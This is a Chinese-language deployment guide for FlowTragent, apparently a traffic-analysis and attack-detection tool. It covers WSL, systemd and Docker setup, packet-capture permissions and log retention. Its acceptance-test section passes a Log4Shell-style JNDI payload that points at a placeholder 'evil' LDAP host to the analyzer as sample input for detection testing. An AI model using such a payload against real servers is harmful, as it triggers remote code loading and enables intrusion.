# FlowTragent 部署指南

## 适用范围

本文统一覆盖三种部署方式：

- WSL Ubuntu 本地验证
- Linux systemd 服务器部署
- Docker / Docker Compose 部署入口

生产部署建议使用 Python 3.11。不要提交 `reports/`、`data/live/`、`data/index/`、真实 PCAP、DataCon 原始数据和模型文件。

## 1. WSL Ubuntu

```bash
cd /mnt/e/ctfcodes/FlowTragent
source ~/miniconda3/etc/profile.d/conda.sh
conda activate flowtragent_py311
python -m pip install -r requirements.txt
python -m pip install gunicorn
```

构建或复用索引：

```bash
FLOWTRAGENT_OFFLINE=1 python scripts/build_demo_index.py \
  --input tests/fixtures/train_payloads.csv \
  --output-dir data/index
```

运行命令行 demo：

```bash
python tests/make_demo_pcap.py
python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
```

启动 Web：

```bash
FLOWTRAGENT_HOST=127.0.0.1 FLOWTRAGENT_PORT=5000 scripts/run_web_prod.sh
```

安全选项：

```bash
export FLOWTRAGENT_TOKEN='change-me'
```

设置后，上传、删除、下载、导出和告警页面需要 Token；`/health` 保持可探活。

## 2. Linux systemd

推荐部署目录：

```bash
sudo useradd --system --home /opt/FlowTragent --shell /usr/sbin/nologin flowtragent
sudo git clone --recurse-submodules https://github.com/sishijiuhack/FlowTragent.git /opt/FlowTragent
cd /opt/FlowTragent
python3.11 -m venv .venv
. .venv/bin/activate
python -m pip install -r requirements.txt gunicorn
```

环境文件：

```bash
sudo mkdir -p /etc/flowtragent
sudo tee /etc/flowtragent/flowtragent.env >/dev/null <<'EOF'
FLOWTRAGENT_HOST=127.0.0.1
FLOWTRAGENT_PORT=5000
FLOWTRAGENT_WORKERS=2
FLOWTRAGENT_GUNICORN_TIMEOUT=120
FLOWTRAGENT_TOKEN=change-me
FLOWTRAGENT_INTERFACE=eth0
FLOWTRAGENT_LIVE_INCOMING_DIR=data/live/incoming
FLOWTRAGENT_SEGMENT_SECONDS=60
FLOWTRAGENT_PACKET_COUNT=0
FLOWTRAGENT_CAPTURE_PROFILE=balanced
FLOWTRAGENT_ALERT_DB=data/live/alerts.db
FLOWTRAGENT_CONFIG=config/config.yaml
FLOWTRAGENT_REPORT_DIR=reports
FLOWTRAGENT_MIN_RISK_SCORE=50
FLOWTRAGENT_POLL_SECONDS=5
FLOWTRAGENT_STABLE_SECONDS=1
FLOWTRAGENT_TOP_K=5
EOF
```

安装服务：

```bash
sudo cp deploy/flowtragent-*.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now flowtragent-web flowtragent-capture flowtragent-analyzer
systemctl is-active flowtragent-web flowtragent-capture flowtragent-analyzer
curl http://127.0.0.1:5000/health
```

抓包权限：

```bash
sudo apt-get update
sudo apt-get install -y tcpdump
sudo setcap cap_net_raw,cap_net_admin=eip "$(command -v tcpdump)"
```

如使用非 `.venv` Python，设置：

```bash
echo 'FLOWTRAGENT_PYTHON=/path/to/python' | sudo tee -a /etc/flowtragent/flowtragent.env
sudo systemctl restart flowtragent-web flowtragent-capture flowtragent-analyzer
```

## 3. Docker / Compose

Docker 一键部署入口由 `Dockerfile` 和 `docker-compose.yml` 提供：

```bash
docker compose up --build
```

建议 Compose 暴露变量：

```env
FLOWTRAGENT_HOST=0.0.0.0
FLOWTRAGENT_PORT=5000
FLOWTRAGENT_TOKEN=change-me
FLOWTRAGENT_INTERFACE=eth0
```

建议挂载卷：

```yaml
volumes:
  - ./reports:/app/reports
  - ./data/live:/app/data/live
  - ./data/index:/app/data/index:ro
```

容器抓包需要额外能力：

```yaml
cap_add:
  - NET_RAW
  - NET_ADMIN
```

如当前环境不能授予容器抓包能力，可先只启动 Web 与 analyzer：

```bash
docker compose up --build web analyzer
```

随后访问：

```bash
curl http://127.0.0.1:5000/health
```

## 4. 日志路径、轮转与保留策略

FlowTragent 当前会产生三类运行日志/状态文件：

| 类型 | 默认路径 | 说明 |
|------|----------|------|
| 结构化 JSON Lines 审计日志 | `logs/flowtragent.jsonl` | 由 `observability.structured_logs.path` 控制，记录 Web 操作、live analyzer 状态、通知结果等关键事件 |
| systemd journal | `journalctl -u flowtragent-*` | systemd 部署时 stdout/stderr 进入 journald |
| live 告警状态库 | `data/live/alerts.db` | 保存 live alert、通知抑制状态、活动关联状态，不应提交到 Git |
| 分析报告 | `reports/` | Markdown/JSON/DOT/SVG 等报告产物，不应提交到 Git |

### 4.1 WSL / 脚本方式

脚本方式默认把结构化日志写入仓库内：

```yaml
observability:
  structured_logs:
    enabled: true
    path: logs/flowtragent.jsonl
    level: INFO
```

建议使用 `logrotate` 或定时任务轮转：

```conf
/mnt/e/ctfcodes/FlowTragent/logs/*.jsonl {
    daily
    rotate 14
    size 50M
    missingok
    notifempty
    compress
    copytruncate
}
```

保留建议：
- `logs/*.jsonl`：保留 14-30 天。
- `reports/`：按演示/审计需要保留，建议定期归档，默认不入库。
- `data/live/alerts.db`：本地调试可定期删除重建；生产环境删除前先导出需要保留的告警。

### 4.2 Linux systemd

systemd 部署建议把 JSONL 日志放到 `/var/log/flowtragent/`，并确保服务用户可写：

```bash
sudo mkdir -p /var/log/flowtragent
sudo chown flowtragent:flowtragent /var/log/flowtragent
echo 'FLOWTRAGENT_STRUCTURED_LOG_PATH=/var/log/flowtragent/flowtragent.jsonl' | sudo tee -a /etc/flowtragent/flowtragent.env
```

如果运行时仍使用 `config/config.yaml`，同步配置：

```yaml
observability:
  structured_logs:
    enabled: true
    path: /var/log/flowtragent/flowtragent.jsonl
    level: INFO
```

建议新增 `/etc/logrotate.d/flowtragent`：

```conf
/var/log/flowtragent/*.jsonl {
    daily
    rotate 30
    size 100M
    missingok
    notifempty
    compress
    delaycompress
    copytruncate
    create 0640 flowtragent flowtragent
}
```

journald 保留策略示例：

```ini
[Journal]
SystemMaxUse=1G
MaxRetentionSec=30day
```

应用后执行：

```bash
sudo systemctl restart systemd-journald
journalctl -u flowtragent-web -u flowtragent-capture -u flowtragent-analyzer --since today
```

### 4.3 Docker / Compose

Compose 部署建议挂载日志目录：

```yaml
volumes:
  - ./logs:/app/logs
  - ./reports:/app/reports
  - ./data/live:/app/data/live
  - ./data/index:/app/data/index:ro
```

Docker stdout/stderr 建议使用 `json-file` 限制大小：

```yaml
logging:
  driver: json-file
  options:
    max-size: "50m"
    max-file: "5"
```

结构化 JSONL 仍由 `observability.structured_logs.path` 控制，容器内默认路径可保持 `logs/flowtragent.jsonl`，宿主机通过 `./logs` 轮转。宿主机 logrotate 示例：

```conf
/opt/flowtragent/logs/*.jsonl {
    daily
    rotate 14
    size 50M
    missingok
    notifempty
    compress
    copytruncate
}
```

### 4.4 敏感数据与 Git 边界

不要提交以下运行产物：

- `logs/`
- `reports/`
- `data/live/`
- `data/tmp/`
- `data/index/`
- 真实 PCAP、DataCon 原始数据、模型文件

结构化日志会对常见敏感字段做脱敏，但仍可能包含路径、IP、URI、CVE 候选、报告文件名等审计信息。生产环境中建议把日志目录权限限制为运维用户和 FlowTragent 服务用户可读。

## 5. 验收命令

```bash
pytest tests/
python tests/test_web_app.py
python main.py --mode payload --input 'GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim' --demo-index
curl http://127.0.0.1:5000/health
```

WSL/服务器有 scapy 时继续运行：

```bash
python tests/test_pipeline.py
python tests/test_live_prefilter.py
python tests/test_live_analyzer_worker.py
```
